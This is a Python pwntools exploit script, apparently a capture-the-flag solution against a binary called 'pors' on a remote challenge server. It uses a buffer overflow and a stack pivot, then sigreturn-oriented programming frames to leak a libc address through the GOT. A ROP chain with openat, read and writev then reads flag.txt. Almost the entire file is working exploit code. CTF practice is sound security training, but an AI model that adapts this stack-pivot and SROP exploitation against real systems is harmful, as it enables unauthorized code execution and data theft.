#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./pors")
libc = exe.libc#ELF("./libc.so.6")

context.binary = exe

REMOTE_NC_CMD    = "nc 193.148.168.30 7668 "    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b main
b *syscall+27
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    POP_RDI = p64(0x00000000004012ec)
    pivot = 0x404090+32

    frame = SigreturnFrame()
    frame.rdi = 20
    frame.rsi = 1      
    frame.rdx = pivot - 8*4
    frame.rcx = 1
    frame.rip = exe.sym.main+70
    frame.rsp = pivot
    frame.rbp = pivot+8*34

    payload = b"A"*32 + p64(pivot) + p64(exe.sym.main+43)
    r.send(payload)
    sleep(0.1)

    payload = p64(exe.got.syscall) + p64(8) + b"A"*16 + p64(pivot) + POP_RDI + p64(15) + p64(exe.plt.syscall) + bytes(frame) 

    frame = SigreturnFrame()
    frame.rdi = 0
    frame.rsi = 0      
    frame.rdx = pivot-8
    frame.rcx = 5000
    frame.rip = exe.sym.main+70
    frame.rsp = pivot
    frame.rbp = 0

    payload += POP_RDI + p64(15) + p64(exe.plt.syscall) + bytes(frame) 

    r.send(payload)
    leak = u64(r.recv(8))  
    libc.address = leak - libc.sym.syscall
    log.info(f"LIBC @ {hex(libc.address)}")
    sleep(0.1)

    rop = ROP(libc)
    
    rop.call("openat", [-100, pivot+200-8, 0, 0])
    rop.call("read", [3, pivot, 80])
    rop.call("writev", [1, pivot+208, 1])

    #gdb.attach(r)
    r.send(rop.chain()+b"flag.txt"+p64(0)+p64(0x4040b0)+p64(80))

    r.interactive()

if __name__ == "__main__":
    main()